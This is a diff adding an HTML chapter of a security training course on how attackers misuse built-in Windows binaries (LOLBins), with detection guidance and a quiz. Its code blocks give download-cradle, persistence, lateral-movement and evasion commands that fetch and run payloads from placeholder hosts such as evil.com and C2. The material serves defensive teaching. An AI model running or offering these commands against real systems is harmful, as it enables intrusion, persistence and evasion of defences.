@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="chapter-id" content="04">
+  <meta name="module-id" content="lolbas">
+  <title>Attacker Tradecraft · LOLBAS · H3AD-LEARN</title>
+  <link rel="icon" href="https://h3ad-sec.github.io/fevicon.png?v=2026">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+  <div class="reading-progress" id="readingProgress"></div>
+  <header class="site-header">
+    <div class="header-inner">
+      <div class="header-left">
+        <a href="../index.html" class="logo-link">
+          <img src="https://raw.githubusercontent.com/h3ad-sec/h3ad-sec.github.io/main/logo-dark.png" id="site-logo" class="site-logo" alt="H3AD-SEC" height="32">
+        </a>
+        <div class="nav-pill">
+          <span class="nav-pill-name">H3AD-LEARN</span>
+          <span class="nav-pill-sep">·</span>
+          <span class="nav-pill-tagline">ATTACKER TRADECRAFT</span>
+        </div>
+      </div>
+      <nav class="header-nav">
+        <a href="../index.html" class="nav-link">Hub</a>
+        <a href="index.html" class="nav-link">LOLBAS</a>
+        <a href="../threat-hunting/index.html" class="nav-link">Threat Hunting</a>
+      </nav>
+      <div class="header-actions">
+        <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+          <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+          <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:none"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+        </button>
+      </div>
+    </div>
+  </header>
+  <div class="chapter-layout">
+    <aside class="toc-sidebar" id="tocSidebar">
+      <a href="index.html" class="toc-back-link">← LOLBAS</a>
+      <div class="toc-chapter-info">
+        <span class="mono accent" style="font-size:0.75rem;letter-spacing:0.1em;">CHAPTER 04 of 8</span>
+        <span class="muted" style="font-size:0.75rem;font-family:var(--font-mono)">35 MIN READ</span>
+      </div>
+      <nav class="toc-nav" id="tocNav"><!-- JS-populated --></nav>
+      <div class="toc-progress">
+        <span class="section-label" style="font-size:0.55rem;letter-spacing:0.2em;color:var(--muted);font-family:var(--font-mono)">PROGRESS</span>
+        <div class="toc-progress-bar"><div class="toc-progress-fill" id="chapterProgressFill"></div></div>
+        <span class="muted" style="font-size:0.72rem;font-family:var(--font-mono)" id="chapterProgressLabel">0 of 6 sections</span>
+      </div>
+    </aside>
+    <main class="chapter-body" id="chapterBody">
+      <article>
+        <header class="chapter-header">
+          <div class="chapter-meta">
+            <span class="badge-module mono">CHAPTER 04</span>
+            <span class="badge-time muted mono">35 MIN READ</span>
+            <span class="badge-diff badge-intermediate">INTERMEDIATE</span>
+          </div>
+          <h1 class="chapter-title">Attacker Tradecraft</h1>
+          <p class="chapter-intro">Knowing which LOLBins exist is only half the picture. This chapter covers how attackers actually use them: the five attack patterns that drive every LOLBin campaign, complete kill chains showing how LOLBins chain together across the attack lifecycle, and the evasion techniques that make them difficult to catch with simple keyword rules.</p>
+          <div class="chapter-tags">
+            <span class="tag">kill chain</span>
+            <span class="tag">download cradle</span>
+            <span class="tag">persistence</span>
+            <span class="tag">lateral movement</span>
+          </div>
+        </header>
+
+        <!-- SECTION 1 -->
+        <section id="five-patterns">
+          <h2>The Five LOLBin Attack Patterns</h2>
+          <p>Attackers use LOLBins for five distinct objectives, each mapping to a different phase of the attack lifecycle. Understanding which pattern is in play determines which detection controls apply.</p>
+
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Pattern</th>
+                  <th>LOLBin Examples</th>
+                  <th>ATT&amp;CK Phase</th>
+                  <th>Key Detection Signal</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>Execution Proxy</td>
+                  <td>mshta, regsvr32 (Squiblydoo), rundll32, installutil</td>
+                  <td>Execution (T1218)</td>
+                  <td>Trusted binary spawning unexpected children or loading remote resources</td>
+                </tr>
+                <tr>
+                  <td>Download Cradle</td>
+                  <td>certutil, bitsadmin, PowerShell IEX, msiexec /i http://</td>
+                  <td>Ingress Tool Transfer (T1105)</td>
+                  <td>Outbound HTTP/HTTPS from non-browser binaries to non-enterprise URLs</td>
+                </tr>
+                <tr>
+                  <td>Persistence</td>
+                  <td>schtasks, WMIC event subscription, reg.exe</td>
+                  <td>Scheduled Task (T1053), Event Triggered (T1546)</td>
+                  <td>Scheduled task or Run key creation with scripting engine in action field</td>
+                </tr>
+                <tr>
+                  <td>Reconnaissance</td>
+                  <td>wmic, nltest, net.exe, systeminfo, whoami</td>
+                  <td>Discovery (T1082, T1069, T1087)</td>
+                  <td>Burst of system discovery commands from a single parent process</td>
+                </tr>
+                <tr>
+                  <td>Lateral Movement</td>
+                  <td>wmic /node:, schtasks /s REMOTEHOST, net use</td>
+                  <td>Remote Services (T1047, T1021)</td>
+                  <td>wmic or schtasks with remote host arguments, explicit credential logon (EID 4648)</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <p>Most real-world LOLBin campaigns use multiple patterns in sequence. An attacker who gains initial access via a phishing attachment will use a download cradle to fetch their implant, an execution proxy to run it, and a persistence mechanism to survive reboots. Detecting any single step breaks the chain. Detecting the pattern across multiple steps is harder to evade.</p>
+
+          <h3>Execution proxy</h3>
+          <p>An execution proxy uses a trusted Windows binary as a wrapper to run attacker code. The most common examples: mshta.exe with a URL or local HTA file, regsvr32.exe loading a remote .sct script (the Squiblydoo technique, named for the LOLBAS project entry), rundll32.exe calling an exported function from a dropped DLL, and installutil.exe running C# code via the InstallUtil serialization callback. In every case, the binary that appears in process logs is a signed Windows tool, not the attacker's code.</p>
+
+          <h3>Download cradle</h3>
+          <p>A download cradle fetches attacker-controlled content from a remote server. It is almost always the first action after initial access. The tool used determines how the download appears in network and process logs, which is why attackers choose carefully based on what detection controls exist in the target environment.</p>
+
+          <h3>Reconnaissance burst</h3>
+          <p>Post-compromise reconnaissance typically happens fast. An attacker who has just popped a shell runs ten to twenty discovery commands in rapid succession to understand the environment: domain name, current user and group membership, running processes, network configuration, and installed software. The burst pattern itself is a detection signal, regardless of which specific binaries are used. A parent process spawning nltest, whoami, net group, and systeminfo within thirty seconds is anomalous regardless of what spawned the parent.</p>
+        </section>
+
+        <!-- SECTION 2 -->
+        <section id="download-cradles">
+          <h2>Download Cradles in Depth</h2>
+          <p>A download cradle fetches a remote resource for execution. It is the most common first post-access action after a foothold is established, and it determines whether a malicious file ever touches disk. The choice of cradle affects detection difficulty, evasion potential, and what forensic artifacts remain.</p>
+
+          <h3>certutil</h3>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>certutil.exe -urlcache -split -f http://EVIL/p.exe C:\Temp\p.exe</code></pre>
+          </div>
+          <p>certutil was designed for certificate management. The <code>-urlcache</code> flag is a legitimate feature for caching certificate revocation data. Attackers discovered it also downloads arbitrary files. This technique is well-known, widely detected, and generates a persistent URL cache entry that survives the download. Despite its age, it still appears in commodity malware because many environments lack the detection coverage to catch it.</p>
+
+          <h3>PowerShell WebClient (file to disk)</h3>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">PowerShell</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>(New-Object Net.WebClient).DownloadFile('http://EVIL/p.exe','C:\Temp\p.exe')</code></pre>
+          </div>
+          <p>Writes the downloaded content to disk. File-based AV can scan the result. Script Block Logging captures the PowerShell command. Slightly harder to detect than certutil because the network activity comes from powershell.exe rather than a certificate utility, which is more plausible as legitimate traffic.</p>
+
+          <h3>PowerShell in-memory (IEX)</h3>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">PowerShell</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>IEX (New-Object Net.WebClient).DownloadString('http://EVIL/p.ps1')</code></pre>
+          </div>
+          <p>Nothing is written to disk. The script content exists only in memory. File-based AV cannot scan it. Script Block Logging captures it, but only if GPO is configured. This is the highest-risk download cradle for environments without PowerShell logging enabled.</p>
+
+          <h3>BITS via bitsadmin</h3>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>bitsadmin /transfer job /download /priority normal http://EVIL/p.exe C:\Temp\p.exe</code></pre>
+          </div>
+          <p>Background Intelligent Transfer Service performs the download asynchronously. Downloads blend into Windows Update traffic. The BITS job persists in the BITS queue database, creating a forensic artifact but also making the download harder to attribute in real time.</p>
+
+          <h3>msiexec remote</h3>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>msiexec /q /i http://EVIL/payload.msi</code></pre>
+          </div>
+          <p>msiexec fetches and installs a remote MSI package silently. The <code>/q</code> flag suppresses all UI. The installation can run arbitrary custom actions, execute scripts, and drop files, all under the context of a signed Windows binary performing what looks like a software installation.</p>
+
+          <h3>Evasion variations</h3>
+          <p>Attackers modify standard download cradle patterns to evade specific detections. certutil with <code>-decode</code> downloads a base64-encoded text file, which reaches a clean URL, then decodes it locally to produce the binary payload. BITS with <code>/SetCustomHeaders</code> injects HTTP headers that blend the request with normal enterprise traffic patterns. PowerShell using the system proxy (<code>-Proxy ([System.Net.WebRequest]::GetSystemWebProxy())</code>) ensures the download routes through enterprise proxy infrastructure, bypassing direct-connection detection rules.</p>
+
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Cradle</th>
+                  <th>Detection Difficulty</th>
+                  <th>Primary Source</th>
+                  <th>Notes</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>certutil -urlcache</td>
+                  <td>Easy</td>
+                  <td>Sysmon EID 1, Process CommandLine</td>
+                  <td>Well-known; most EDRs alert. URL cache artifact persists post-deletion.</td>
+                </tr>
+                <tr>
+                  <td>PowerShell DownloadFile</td>
+                  <td>Medium</td>
+                  <td>Script Block Logging EID 4104, network log</td>
+                  <td>Requires PS logging. File touches disk for AV scanning.</td>
+                </tr>
+                <tr>
+                  <td>PowerShell IEX</td>
+                  <td>Medium (with SBL)</td>
+                  <td>Script Block Logging EID 4104</td>
+                  <td>No file on disk. Invisible without SBL enabled.</td>
+                </tr>
+                <tr>
+                  <td>bitsadmin BITS</td>
+                  <td>Medium</td>
+                  <td>BITS event log, Sysmon EID 1</td>
+                  <td>Async download blends with Windows Update traffic.</td>
+                </tr>
+                <tr>
+                  <td>msiexec /i http://</td>
+                  <td>Medium</td>
+                  <td>Sysmon EID 1, network log</td>
+                  <td>Looks like software installation. Custom actions can execute arbitrary code.</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </section>
+
+        <!-- SECTION 3 -->
+        <section id="execution-chains">
+          <h2>Kill Chains: Chaining LOLBins Together</h2>
+          <p>A single LOLBin detection blocks one step. Real campaigns chain multiple LOLBins across multiple phases. Parent-child chain analysis detects the entire kill chain by identifying anomalous spawn sequences, regardless of which specific binaries are involved.</p>
+
+          <h3>Chain 1: Phishing email dropper</h3>
+          <p>This chain is among the most common in commodity malware campaigns.</p>
+          <ol>
+            <li><strong>Email client opens attachment</strong>: The user opens a .vbs or .js file attached to a phishing email. The mail client spawns wscript.exe directly.</li>
+            <li><strong>wscript.exe runs VBS dropper</strong>: The VBScript uses <code>XMLHTTP</code> to download a stage-2 binary via certutil or a PowerShell one-liner, saving it to <code>%TEMP%</code>.</li>
+            <li><strong>Stage 2 runs as rundll32 or mshta</strong>: The downloaded payload is a DLL invoked via rundll32.exe, or an HTA file run by mshta.exe. Both are trusted Windows binaries.</li>
+            <li><strong>Persistence via schtasks</strong>: The implant creates a scheduled task using schtasks.exe with an mshta or wscript action pointing to a remote URL.</li>
+          </ol>
+          <p><strong>Highest-value detection point:</strong> Step 1. Email client (Outlook.exe, Thunderbird.exe) spawning wscript.exe is almost never legitimate. This parent-child relationship is a near-certain indicator of malicious activity and should be a high-confidence alert.</p>
+
+          <h3>Chain 2: Office macro</h3>
+          <p>Office macros remain a dominant initial access vector despite decades of mitigations.</p>
+          <ol>
+            <li><strong>winword.exe opens malicious document</strong>: The user enables macros. The VBA macro runs.</li>
+            <li><strong>winword.exe spawns cmd.exe</strong>: The macro calls <code>Shell</code> to run a cmd command. This is the anomalous parent-child relationship.</li>
+            <li><strong>cmd.exe runs PowerShell download cradle</strong>: <code>powershell -enc [encoded IEX cradle]</code>. The payload is fetched from a C2 server and executed in memory.</li>
+            <li><strong>certutil downloads implant</strong>: As a fallback or alternative, certutil downloads a binary to <code>%TEMP%</code>.</li>
+            <li><strong>schtasks creates persistence</strong>: A scheduled task with <code>/tr "mshta.exe http://C2/persist.hta"</code> ensures the attacker maintains access through reboots.</li>
+          </ol>
+          <p><strong>Highest-value detection point:</strong> Step 2. Office applications spawning cmd.exe, PowerShell, wscript, or certutil directly is a well-established detection rule and blocks the chain before any payload executes.</p>
+
+          <h3>Chain 3: HTML smuggling</h3>
+          <p>HTML smuggling bypasses email gateway file-type restrictions by encoding payloads inside HTML rather than attaching them directly.</p>
+          <ol>
+            <li><strong>Browser downloads HTML lure page</strong>: The user clicks a link or opens an HTML attachment. The page contains embedded JavaScript.</li>
+            <li><strong>JavaScript decodes payload in-browser</strong>: The script uses <code>atob()</code> or a custom decoder to reconstruct a binary payload (typically a .hta, .iso, or .zip file) from base64 strings embedded in the HTML.</li>
+            <li><strong>Browser saves decoded file locally</strong>: The JavaScript uses the HTML5 Blob API to trigger a file download. The browser saves a .hta or other file to the Downloads folder.</li>
+            <li><strong>mshta.exe executes the HTA</strong>: If the saved file is an HTA, double-clicking it launches mshta.exe. Many browsers open certain file types automatically.</li>
+            <li><strong>mshta spawns cmd</strong>: The HTA VBScript calls <code>WScript.Shell.Run "cmd /c ..."</code>.</li>
+            <li><strong>cmd runs certutil or PowerShell cradle</strong>: Stage 2 is fetched and executed.</li>
+          </ol>
+          <p><strong>Highest-value detection point:</strong> Step 4. mshta.exe spawned by explorer.exe (from a user double-clicking a file) with an HTA from the Downloads or %TEMP% directory is a high-fidelity indicator. Browser-spawned mshta.exe is even more anomalous.</p>
+        </section>
+
+        <!-- SECTION 4 -->
+        <section id="lolbin-persistence">
+          <h2>LOLBin-Based Persistence</h2>
+          <p>The most effective LOLBin persistence techniques share a common property: no malicious file on disk at the point the payload runs. The persistence mechanism (a scheduled task entry or a registry key) exists, but it points to a trusted binary that fetches its payload at execution time from a remote URL. Forensic investigators looking for malware files find nothing.</p>
+
+          <h3>Scheduled task with scripting engine URL</h3>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>schtasks /create /tn "WindowsDefenderUpdate" /tr "mshta.exe http://C2/task.hta" /sc daily /st 09:00 /f</code></pre>
+          </div>
+          <p>This creates a daily scheduled task. When it fires, mshta.exe fetches the current HTA from the C2 server and executes it. The task XML in <code>C:\Windows\System32\Tasks\</code> is the only artifact on disk. The payload is entirely remote, refreshed each execution. If the C2 server is unavailable, nothing suspicious runs. This technique also allows the attacker to update their payload without touching the target machine.</p>
+
+          <h3>Registry Run key with mshta URL</h3>
+          <p>A single registry write establishes execution on every user logon:</p>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdate" /t REG_SZ /d "mshta.exe https://C2/payload.hta" /f</code></pre>
+          </div>
+
+          <div class="callout-tip"><strong>Tip:</strong> Registry Run key plus mshta URL is one of the stealthiest persistence techniques available. The payload never touches disk. Defenders looking for files will find nothing. Only registry monitoring (looking for Run key values containing mshta, wscript, or scripting engine paths with URLs) and network behavior analysis reliably catch it.</div>
+
+          <h3>WMI permanent event subscription (T1546.003)</h3>
+          <p>WMI subscriptions persist entirely within the WMI repository, not as files on the filesystem. The structure requires three components: an event filter (defines the trigger condition, such as user logon or a specific process starting), an event consumer (defines the action, typically running wscript.exe or powershell.exe with an attacker-controlled argument), and a filter-to-consumer binding that connects them.</p>
+          <p>All three are stored in the WMI repository at <code>%SystemRoot%\System32\wbem\Repository\</code>. Traditional file-based forensics does not find anything suspicious. The persistence survives reboots and reinstallation of most security tools. Detection requires WMI-specific tooling or Sysmon Event IDs 19, 20, and 21 (WmiEvent filter/consumer/binding creation).</p>
+
+          <h3>BITS persistence</h3>
+          <p>A BITS job can be configured with a notification command that runs when the job completes. An attacker creates a BITS job that downloads a small file from a C2 server and sets <code>/SetNotifyCmdLine</code> to invoke mshta.exe or powershell.exe with the downloaded content. The BITS job persists in the BITS queue and restarts automatically if interrupted.</p>
+
+          <h3>Detection</h3>
+          <p>Key signals for LOLBin persistence:</p>
+          <ul>
+            <li>Sysmon EID 1: schtasks.exe with <code>/create</code> and <code>/tr</code> containing mshta, wscript, cscript, powershell, or a URL string</li>
+            <li>Registry monitoring: writes to Run/RunOnce keys where the value contains a URL or a scripting engine path followed by unusual arguments</li>
+            <li>Sysmon EID 19/20/21: WMI event filter, consumer, and binding creation events. Any WMI CommandLine consumer pointing to wscript or powershell warrants investigation.</li>
+            <li>BITS operational log (Microsoft-Windows-Bits-Client/Operational): job creation with unusual transfer URLs</li>
+          </ul>
+        </section>
+
+        <!-- SECTION 5 -->
+        <section id="lateral-movement">
+          <h2>LOLBin-Based Lateral Movement</h2>
+          <p>With valid credentials obtained through earlier stages (credential dumping, pass-the-hash, password spraying), Windows built-in tools provide full lateral movement capability. No additional offensive tooling is required.</p>
+
+          <h3>WMIC remote process creation (T1047)</h3>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>wmic /node:TARGETIP /user:DOMAIN\Administrator /password:PASSWORD process call create "cmd.exe /c C:\Windows\Temp\p.exe"</code></pre>
+          </div>
+          <p>This creates a process on the remote host using WMI. The <code>/node:</code> parameter specifies the target, and the process runs in the SYSTEM context on the remote machine. No additional tools needed beyond wmic.exe, which is a signed Windows binary present on every Windows installation. The command requires valid credentials and network access to the target on port 135 (DCOM/RPC).</p>
+
+          <h3>Scheduled task on remote host</h3>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>schtasks /create /s TARGETHOST /tn "Updater" /tr "C:\Windows\Temp\p.exe" /sc once /st 10:00 /u DOMAIN\Administrator /p PASSWORD /f
+schtasks /run /s TARGETHOST /tn "Updater"</code></pre>
+          </div>
+          <p>schtasks with <code>/s REMOTEHOST</code> creates and runs tasks on a remote system over SMB (IPC$). The technique requires valid credentials and SMB access. It creates a scheduled task entry on the remote host, which is a detectable forensic artifact, but the execution itself happens through a trusted Windows binary on both ends.</p>
+
+          <h3>Detection signals</h3>
+          <p>WMIC lateral movement leaves a consistent trail across source and target:</p>
+          <ul>
+            <li>Source: Sysmon EID 1 for wmic.exe with <code>/node:</code> argument containing a non-localhost IP or hostname. Filter out <code>/node:localhost</code> and <code>/node:127.0.0.1</code>.</li>
+            <li>Source: Windows Security EID 4648 (explicit credential logon) when credentials are specified inline.</li>
+            <li>Target: Windows Security EID 4624 (successful logon) with logon type 3 (network logon).</li>
+            <li>Target: Windows Security EID 4688 (process creation) showing the spawned process with a parent of WmiPrvSE.exe.</li>
+          </ul>
+          <p>The clearest single indicator is wmic.exe in CommandLine with a <code>/node:</code> value that is not localhost. Workstation-to-workstation authentication patterns in 4648 events are another strong signal, particularly when the authenticating account is a privileged domain account used outside normal administrative systems.</p>
+
+          <div class="callout-info"><strong>Note:</strong> WMIC lateral movement is a post-credential technique. It requires credentials obtained during earlier attack stages. Detecting WMIC lateral movement without also detecting the credential theft that preceded it addresses the symptom, not the root cause. Correlating the credential theft event with subsequent lateral movement events provides the full picture for incident response.</div>
+        </section>
+
+        <!-- SECTION 6 -->
+        <section id="evasion-techniques">
+          <h2>Evasion Techniques in LOLBin Tradecraft</h2>
+          <p>Command-line detection rules typically match string patterns. Binary names, flag names, and URL substrings are common targets. Attackers apply several techniques to corrupt these strings at the command-line level while preserving execution semantics.</p>
+
+          <h3>Caret insertion</h3>
+          <p>The Windows command interpreter treats the caret (<code>^</code>) as an escape character and strips it before passing the argument to the target process. Inserting carets into binary names and flag names breaks string matching without affecting execution:</p>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>cer^tutil.exe -url^cache -split -f h^ttp://evil.com/p.exe C:\Temp\p.exe
+po^wer^shell -e^nc BASE64PAYLOAD</code></pre>
+          </div>
+
+          <h3>String concatenation in PowerShell</h3>
+          <p>PowerShell evaluates string concatenation before the resulting string is used as a method or parameter name. Detection rules matching the literal string <code>DownloadString</code> miss the concatenated form:</p>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">PowerShell</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>$c = New-Object Net.WebClient
+$c.('Down'+'loadString')('http://evil.com/p.ps1') | IEX</code></pre>
+          </div>
+
+          <h3>Environment variable substitution</h3>
+          <p>Windows environment variables resolve to their values before command execution. Substituting binary names with variable references breaks literal string matching:</p>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>%COMSPEC% /c certutil -urlcache -f http://evil.com/p.exe C:\Temp\p.exe
+%SystemRoot%\System32\certutil.exe -urlcache -f http://evil.com/p.exe C:\Temp\p.exe</code></pre>
+          </div>
+
+          <h3>Flag abbreviation</h3>
+          <p>Most Windows command-line tools accept abbreviated flag names. Detection rules matching the full flag string miss shortened versions:</p>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>powershell -e BASE64         (short for -EncodedCommand)
+wmic pro li                  (short for process list)
+schtasks /cr /tn "x" /tr "mshta http://C2/p.hta" /sc daily</code></pre>
+          </div>
+
+          <h3>PPID spoofing</h3>
+          <p>Parent Process ID (PPID) spoofing uses the Windows <code>CreateProcess</code> API with a custom <code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code> attribute to specify a parent process handle different from the actual creating process. The resulting process appears in Sysmon EID 1 and Event ID 4688 logs as if it was spawned by the nominated parent, typically explorer.exe or svchost.exe. Parent-child chain detection rules that look for Office spawning cmd.exe or mshta spawning powershell will not fire because the reported parent is the spoofed one, not the real attacker process.</p>
+          <p>Detection: Compare the Sysmon-reported parent PID against the actual process ancestry via EDR telemetry that validates call chains through API-level monitoring rather than trusting the reported PID value. Some EDR products specifically detect the attribute injection used for PPID spoofing.</p>
+
+          <h3>Living off the cloud</h3>
+          <p>A download cradle that fetches from a known-malicious IP or newly registered domain is easy to block. Attackers host payloads on legitimate cloud infrastructure instead: raw GitHub content URLs, SharePoint sites, OneDrive shares, Discord CDN attachment URLs, and Pastebin. certutil and BITS downloads to these destinations appear to reach trusted, categorized domains. Proxy and firewall rules that allow access to GitHub.com or discord.com cannot block this traffic by domain alone. Detection requires inspecting what is being downloaded, not just where it is going, which pushes the detection requirement toward endpoint telemetry (Script Block Logging, process behavior) rather than network controls.</p>
+
+          <h3>Building resilient detections</h3>
+          <p>The evasion techniques above all target string matching on raw command lines. More resilient approaches:</p>
+          <ul>
+            <li>Normalize command lines before matching: strip carets, resolve environment variables, expand abbreviations. Some SIEM platforms and EDRs do this automatically.</li>
+            <li>Parent-child chain analysis: focus on the relationship between processes rather than individual command lines. Even with PPID spoofing, behavioral anomalies in what the process does after launch remain detectable.</li>
+            <li>Network destination enrichment: for cloud-hosted cradles, look at TLS certificate subject, hosting ASN, and domain registration age rather than just the domain name.</li>
+            <li>Script Block Logging: not susceptible to command-line obfuscation. The deobfuscated code is what gets logged.</li>
+          </ul>
+        </section>
+
+        <div class="chapter-summary">
+          <h3>Key Takeaways</h3>
+          <ul>
+            <li>Attackers use LOLBins for five objectives: execution proxy, download cradle, persistence, reconnaissance, and lateral movement. Each requires a targeted detection approach rather than a single rule set.</li>
+            <li>Download cradles are typically the first post-access action. certutil and PowerShell IEX are the most common. Detecting outbound HTTP from these binaries to non-enterprise URLs is a high-signal indicator.</li>
+            <li>Kill chains chain multiple LOLBins across phases. Detecting a single step is useful; parent-child chain analysis detects the entire chain by catching anomalous spawn sequences that are difficult to evade.</li>
+            <li>LOLBin persistence via scheduled tasks or registry Run keys with mshta and a remote URL leaves no payload file on disk. Only registry monitoring and scheduled task creation events with scripting engine actions reveal it.</li>
+            <li>WMIC remote process creation enables lateral movement with valid credentials and no additional tools. wmic.exe with a <code>/node:</code> argument pointing to a non-local host is the key detection signal.</li>
+            <li>Command-line obfuscation (caret insertion, string concatenation, variable substitution) targets keyword matching. Normalize command lines before matching, and prioritize parent-child chain detections that are structurally resistant to obfuscation.</li>
+          </ul>
+        </div>
+
+        <div class="knowledge-check">
+          <h3 class="kc-title">Knowledge Check</h3>
+          <p class="kc-intro muted">Click an answer to reveal the explanation.</p>
+
+          <div class="kc-question">
+            <p class="kc-prompt">An attacker creates a scheduled task with a trigger of daily and an action of "mshta.exe https://C2/task.hta". What makes this particularly difficult to detect through file-based forensics?</p>
+            <div class="kc-options">
+              <button class="kc-option" data-correct="false">A. The scheduled task is hidden in a protected system folder</button>
+              <button class="kc-option" data-correct="true">B. No malicious file exists on disk — mshta fetches the payload from the remote URL each time the task runs</button>
+              <button class="kc-option" data-correct="false">C. The task runs before security tools are loaded at system startup</button>
+              <button class="kc-option" data-correct="false">D. mshta.exe is excluded from scheduled task monitoring by Windows by default</button>
+            </div>
+            <div class="kc-answer">The persistence mechanism uses a scheduled task (which does leave a trace in the task XML on disk and in the registry) but the payload itself is always remote. Every time the task fires, mshta.exe fetches the current HTA from the C2 server. There is no local malicious file to discover, hash, or quarantine. Defenders must examine the task definition itself (the <code>/tr</code> argument) and network behavior to identify this pattern. Looking for executable files or malware signatures on disk will find nothing.</div>
+          </div>
+
+          <div class="kc-question">
+            <p class="kc-prompt">Which command-line pattern most clearly identifies WMIC-based lateral movement?</p>
+            <div class="kc-options">
+              <button class="kc-option" data-correct="false">A. wmic.exe process list brief</button>
+              <button class="kc-option" data-correct="true">B. wmic.exe /node:TARGETHOST ... process call create</button>
+              <button class="kc-option" data-correct="false">C. wmic.exe computersystem get domain</button>
+              <button class="kc-option" data-correct="false">D. wmic.exe shadowcopy delete</button>
+            </div>
+            <div class="kc-answer">The <code>/node:</code> parameter directs WMIC to execute the command on a remote host. Combined with <code>process call create</code>, this is remote process execution, which is lateral movement. Local wmic queries (process list, computersystem get, shadowcopy) do not use <code>/node:</code> with a remote target. The detection rule should exclude <code>/node:localhost</code> and <code>/node:127.0.0.1</code> and flag any non-local <code>/node:</code> target, particularly when combined with explicit credential arguments.</div>
+          </div>
+
+          <div class="kc-question">
+            <p class="kc-prompt">What Windows API technique allows an attacker to make a maliciously spawned cmd.exe appear in process tree logs as if it was spawned by explorer.exe?</p>
+            <div class="kc-options">
+              <button class="kc-option" data-correct="false">A. Process hollowing</button>
+              <button class="kc-option" data-correct="true">B. PPID spoofing (Parent Process ID forgery)</button>
+              <button class="kc-option" data-correct="false">C. Token impersonation</button>
+              <button class="kc-option" data-correct="false">D. COM elevation hijacking</button>
+            </div>
+            <div class="kc-answer">PPID spoofing uses the Windows CreateProcess API with a custom parent process handle specified via <code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code> to nominate a different parent than the actual creating process. The resulting process tree in Sysmon and Event Log shows the spoofed parent. Detection rules that look for anomalous spawn sequences (Office spawning cmd.exe, for example) will not fire because the reported parent is explorer.exe or another benign process. Detection requires EDR telemetry that validates process ancestry through API call chain analysis rather than trusting the reported parent PID value in event log entries.</div>
+          </div>
+        </div>
+
+        <nav class="chapter-nav">
+          <a href="03-lolscripts-net.html" class="chapter-nav-prev">← LOLScripts and Drivers</a>
+          <a href="05-detection-strategy.html" class="chapter-nav-next">Detection Strategy →</a>
+        </nav>
+      </article>
+    </main>
+  </div>
+  <script src="../js/learn.js"></script>
+  <script>document.addEventListener('DOMContentLoaded', () => initChapter('04', 6));</script>
+</body>
+</html>
